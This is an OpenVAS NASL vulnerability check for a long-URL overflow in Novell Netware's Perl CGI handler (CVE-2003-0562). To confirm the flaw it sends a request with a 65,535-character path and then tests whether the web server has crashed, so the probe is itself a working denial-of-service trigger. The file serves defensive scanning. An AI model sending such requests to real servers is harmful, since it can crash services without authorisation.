# OpenVAS Vulnerability Test
# $Id: netware_perl_overflow.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Netware Perl CGI overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote web server crashes when it receives a too long URL
for the Perl handler.

It might be possible to make it execute arbitrary code through this flaw.
See http://support.novell.com/servlet/tidfinder/2966549";

tag_solution = "Upgrade your web server.";

# Vulnerable:
# Netware 5.1 SP6, Netware 6

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.11827");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(8251);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_cve_id("CVE-2003-0562");

 name = "Netware Perl CGI overflow";
 script_name(name);
 

 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul"); 
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before OpenVAS 
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright("This script is Copyright (C) 2003 Michel Arboi");
 family = "Gain a shell remotely";
 script_family(family);
 script_dependencies("gb_get_http_banner.nasl");
 script_mandatory_keys("Novell_Netware/banner");
 script_require_ports("Services/www",80);
 script_exclude_keys("www/too_long_url_crash");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#

include("http_func.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);

if(http_is_dead(port:port))exit(0);
banner = get_http_banner(port:port);
if(!banner)exit(0);
if("Novell" >!< banner && "Netware" >!< banner)exit(0);

soc = http_open_socket(port);
if (!soc) exit(0);

req = string("/perl/", crap(65535));
req = http_get(item:req, port:port);
send(socket:soc, data:req);
r = http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port: port, retry:4))
{
  security_message(port);
}
